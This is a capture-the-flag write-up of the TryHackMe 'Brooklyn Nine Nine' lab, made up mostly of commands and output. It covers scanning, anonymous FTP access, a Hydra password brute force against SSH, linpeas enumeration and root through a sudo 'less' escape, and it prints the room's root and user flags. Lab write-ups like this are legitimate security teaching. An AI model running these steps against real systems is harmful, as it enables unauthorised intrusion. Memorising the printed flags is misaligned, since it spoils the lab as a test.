# Overview
https://tryhackme.com/room/brooklynninenine

## NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```

## Gobuster
```
gobuster dir -u "http://$IP" -w $WORDLIST -x php,txt,html | tee gobuster.log
```

## FTP
We can see the FTP port was left open, lets see whats on there:
```
jakeholl@Jakes-MacBook-Pro Downloads % ftp 10.10.4.48
Connected to 10.10.4.48.
220 (vsFTPd 3.0.3)
Name (10.10.4.48:jakeholl): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
WARNING! 5 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
119 bytes received in 0.000537 seconds (216 kbytes/s)
ftp> quit
221 Goodbye.
```
Downloaded the file, we find a username, `jake` and maybe `amy`

## hyra
For finding passwords
```
hydra -l jake -P /opt/rockyou.txt ssh://$IP
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2020-12-04 21:08:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.4.48:22/
[22][ssh] host: 10.10.4.48   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2020-12-04 21:08:55
```

# linpeas!
```
scp linpeas jake@$IP:/tmp
```
We can see the following users:
```
[+] Last time logon each user
Username         Port     From             Latest
amy              pts/1    10.10.10.18      Mon May 18 10:23:27 +0000 2020
holt             pts/0    10.10.10.18      Tue May 26 08:59:00 +0000 2020
jake             pts/0    10.2.44.85       Fri Dec  4 21:12:00 +0000 2020
```

Also this:
```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Trying `sudo -l`
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Ok, now let's use [GTFOBins](https://gtfobins.github.io/gtfobins/less/) for a shell:
```
jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
# ls
# ls /root
root.txt
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
#
```

Now that we have shell, let's try to find the user flag:
```
# ls /home
amy  holt  jake
# ls /home/amy
# ls /home/holt
nano.save  user.txt
# cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
#
```
